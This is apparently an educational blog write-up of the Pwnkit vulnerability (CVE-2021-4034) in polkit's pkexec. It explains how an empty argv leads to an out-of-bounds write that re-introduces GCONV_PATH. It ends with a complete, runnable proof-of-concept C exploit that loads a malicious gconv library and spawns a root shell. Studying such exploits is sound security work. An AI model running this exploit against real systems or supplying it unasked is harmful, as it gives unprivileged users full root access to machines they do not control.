# Pwnkit (CVE-2021-4034)
CVE-2021-4034 dubbed Pwnkit is a pretty cool and easy-to-understand exploit, newbies should understand how the exploit works since it is pretty straightforward. Before anything, know that i am far away from being the first one who make a blog on this CVE and for this reason i highly suggest that you go check [previous research on the vulnerability by Qualys](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt). 
## What is pkexec
First to understand the exploit we have to understand pkexec. As per the man page, pkexec allows an authorized user to execute a program as another user, if no user is specified then the program will be executed as the super user, root.

This vulnerability is an attacker's dream come true:
- pkexec is installed by default on all major Linux distributions (we exploited Ubuntu, Debian, Fedora, CentOS, and other distributions are probably also exploitable);
- pkexec is vulnerable since its creation, in May 2009 (commit c8c3d83, "Add a pkexec(1) command");
- any unprivileged local user can exploit this vulnerability to obtain full root privileges;
- although this vulnerability is technically a memory corruption, it is exploitable instantly, reliably, in an architecture-independent way;
- and it is exploitable even if the polkit daemon itself is not running.

## The vulnerability
Here comes the vulnerable part, the beginning of pkexec's main() function processes the commad-line arguments (line 534-568) and searches for the program to be executes, if its path is not absolute, in the directories of the PATH environment variable (lines 610-640) :
```c
435 main (int argc, char *argv[])
436 {
...
534   for (n = 1; n < (guint) argc; n++)
535     {
...
568     }
...
610   path = g_strdup (argv[n]);
...
629   if (path[0] != '/')
630     {
...
632       s = g_find_program_in_path (path);
...
639       argv[n] = path = s;
640     }
```
Unfortunately, if the number of command-line arguments (argc) is 0 - which means if the argument list argv that we pass to execve() is empty, i.e {NULL} - then `argv[0]` is **NULL**. This is the argument list's terminator. Therefore :
- at line 534, the integer n is permanently set to 1;
- at line 610, the pointer path is read out-of-bounds from `argv[1]`;
- at line 639, the pointer s is written out-of-bounds `argv[1]`.

But what exactly is read from and written to this out-of-bounds `argv[1]` ?

To answer this question, we must digress briefly. When we execve() a ne program, the kernel copies our argument, environment strings, and pointers (argc and envp) to the end of the new program's stack; for example :
```
|---------+---------+-----+------------|---------+---------+-----+------------| 
| argv[0] | argv[1] | ... | argv[argc] | envp[0] | envp[1] | ... | envp[envc] | 
|----|----+----|----+-----+-----|------|----|----+----|----+-----+-----|------| 
V         V                V           V         V                V 
"program" "-option"           NULL      "value" "PATH=name"          NULL 
```
Clearly because the argv and envp pointers are contiguous i memory, if argc is 0, then the out-of-bounds `argv[1]` is actually `envp[0]`, the pointer to our first environment variable, "value". Consequently :
- At line 610, the path of the program to be executed is read out-of-bounds from `argv[1]` (i.e `envp[0]`, and points to "value").
- At line 632, this path "value" is passed to `g_find_program_in_path()` (because "value does not start with a slash", at line 629).
- Then, `g_find_program_in_path()` searches for an executable file named "value" in the directories of our PATH environment variable.
- If such an executable file is found, its full path is returned to pkexec's main() function (at line 632).
- Finally, at line 639, this full path is written out-of-bounds to `argv[1]` (i.e `envp[0]`), thus overwriting our first environment variable.

So stated more precisely :
- If our PATH environment variable is "PATH=name", and if the directory "name" exists (in the current working directory) and contains an executable file named "value", then a pointer to the string "name/value" is written out-of-bounds to `envp[0]`.
OR
- If our PATH is "PATH=name=.", and if the directory "name=." exists and contains an executable file named "value", then a pointer to the string "name=./value" is written out-of-bounds to `envp[0]`.

In other words, this out-of-bounds write allows us to re-introduce an "unsecure" environment variable (for example LD_PRELOAD) into pkexec's environment. These "unsecure" variables are normally removed (by ld.so) from the environment of SUID programs before the main() function is called.

Last-minute note: polkit also supports non-Linux operating systems such as Solaris and \*BSD, but we have not investigated their exploitability. However we note that OpenBSD is not exploitable, because its kernel refuses to execve() a program if argc is 0.

## Exploitation
Our question is : to successfully exploit this vulnerability, which "unsecure" variable should we re-introduce into pkexec's environment? Our options are limited, because shortly after the out-of-bounds write (at line 639), pkexec completely clears its environment (at line 702).
```
------------------------------------------------------------------------
 639       argv[n] = path = s;
 ...
 657   for (n = 0; environment_variables_to_save[n] != NULL; n++)
 658     {
 659       const gchar *key = environment_variables_to_save[n];
 ...
 662       value = g_getenv (key);
 ...
 670       if (!validate_environment_variable (key, value))
 ...
 675     }
 ...
 702   if (clearenv () != 0)
------------------------------------------------------------------------
```
The answer to our question comes from pkexec's complexity: to print an error message to stderr, pkexec calls the GLib's function `g_printerr()` (note: the Glib is a GNOME library, note the GNU C Library, aka glibc); for example, the functions `validate_environment_variable()` and `log_message()` call `g_printerr()` (at lines 126 and 408-409):
```
------------------------------------------------------------------------
  88 log_message (gint     level,
  89              gboolean print_to_stderr,
  90              const    gchar *format,
  91              ...)
  92 {
 ...
 125   if (print_to_stderr)
 126     g_printerr ("%s\n", s);
------------------------------------------------------------------------
 383 validate_environment_variable (const gchar *key,
 384                                const gchar *value)
 385 {
 ...
 406           log_message (LOG_CRIT, TRUE,
 407                        "The value for the SHELL variable was not found the /etc/shells file");
 408           g_printerr ("\n"
 409                       "This incident has been reported.\n");
------------------------------------------------------------------------
```
`g_printerr()` normally prints UTF-8 error messages, but it can print messages in another charset if the environment variable `CHARSET` is not `UTF-8` (note: CHARSET is not security sensitive, it is not an "unsecure" environment variable). To convert messages from UTF-8 to another charset, `g_printerr()` calls the glibc's function from `iconv_open()`.

To convert messages from one charset to another, `iconv_open()` executes small shared libraries; normally, these triplets ("from" charset. "to" charset, and library name) are read from a default configuration file, `/usr/lib/gconv/gconv-modules`. Alternatively, the environment variable `GCONV_PATH` can force `iconv_open()` to read another configuration file; naturaly, `GCONV_PATH` is **one of the "unsecure" environment variables (because it leads to the execution of arbitrary libraries)**, and is therefore removed by `ld.so` from the **environment of SUID programs**.

Unfortunately, CVE-2021-4034 allows us to re-introduce `GCONV_PATH` into pkexec's environment, and to execute our own shared library, as root.

IMPORTANT : *this exploitation technique leaves traces in the logs (either "the value for the SHELL variable was not found in the /etc/shells file" or "the value for environment variable [...] contains suspicious content"). However, please note that this vulnerability is also exploitable without leaving any traces in the logs, but this is left as an exercise for the interested reader.*
## Proof of Concept
The most popular proof of concept for this exploit might be the one available at [this link](https://github.com/arthepsy/CVE-2021-4034) by arthepsy.
```c
/*

* Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) by Andris Raugulis <moo@arthepsy.eu>

* Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034

*/

#include <stdio.h>

#include <stdlib.h>

#include <unistd.h>

char *shell = "#include <stdio.h>\n"
			  "#include <stdlib.h>\n"
			  "#include <unistd.h>\n\n"
			  "void gconv() {}\n"
			  "void gconv_init() {\n"
			  " setuid(0); setgid(0);\n"
			  " seteuid(0); setegid(0);\n"
			  " system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"
			  " exit(0);\n"
			  "}";

int main(int argc, char *argv[]) {
	FILE *fp;
	system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
	system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
	fp = fopen("pwnkit/pwnkit.c", "w");
	fprintf(fp, "%s", shell);
	fclose(fp);
	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
	execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}
```
